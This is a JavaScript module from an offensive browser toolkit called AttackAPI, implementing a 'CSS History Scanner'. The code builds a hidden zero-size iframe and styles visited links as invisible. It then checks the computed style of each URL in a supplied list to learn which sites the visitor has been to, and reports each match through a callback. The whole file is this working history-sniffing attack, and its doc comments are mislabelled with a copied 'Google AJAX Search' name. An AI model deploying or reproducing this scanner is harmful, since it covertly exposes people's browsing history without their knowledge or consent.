
/**
 * @name AttackAPI.Util['::DOM::CSS History Scanner']
 * @desc perform search via Google AJAX Search API
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::CSS History Scanner'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Google AJAX Search'].prototype.scan
	 * @desc perform the scan
	 * @param Object r the request object to be used
	 */
	scan: function (r) {
		var ifr = document.createElement('iframe');
		ifr.style.visibility = 'hidden';
		ifr.style.width = ifr.style.height = 0;
		
		document.body.appendChild(ifr);
		
		var doc = this.getDoc(ifr);
		doc.open();
		doc.write('<style>a:visited{display: none}</style>');
		doc.close();
		
		for (var i = 0; i < r.urls.length; i++) {
			var a = doc.createElement('a');
			a.href = r.urls[i];
			
			doc.body.appendChild(a);
			
			if (a.currentStyle)
				var display = a.currentStyle['display'];
			else
				var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display')
				
			if (display == 'none' && typeof(r.onfound) == 'function')
				r.onfound(r.urls[i], r);
		}
		
		document.body.removeChild(ifr);
		
		if (typeof(r.oncomplete) == 'function')
			r.oncomplete(r);
	}
});